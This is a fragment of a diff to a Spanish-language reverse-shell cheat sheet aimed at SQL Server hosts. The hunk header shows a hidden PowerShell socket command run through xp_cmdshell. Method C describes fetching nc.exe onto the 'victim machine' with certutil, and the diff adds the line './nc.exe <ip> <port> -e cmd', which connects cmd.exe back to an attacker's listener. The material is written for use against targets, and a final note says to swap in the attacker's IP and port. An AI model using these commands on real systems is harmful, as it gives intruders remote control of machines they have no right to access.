@@ -47,6 +47,9 @@ EXEC xp_cmdshell 'powershell -NoP -NonI -W Hidden -Command "$c=New-Object Net.So
 ### 4) Método C — certutil + nc.exe
 - Descarga `nc.exe` en la máquina víctima con `certutil`.
 - Ejecuta nc.exe con parámetros para conectarse a tu listener y lanzar cmd.exe.
+```powershell
+./nc.exe <ip> <port> -e cmd
+```
 
 ## Notas rápidas
 - Cambia la IP del atacante y el puerto según tu entorno.
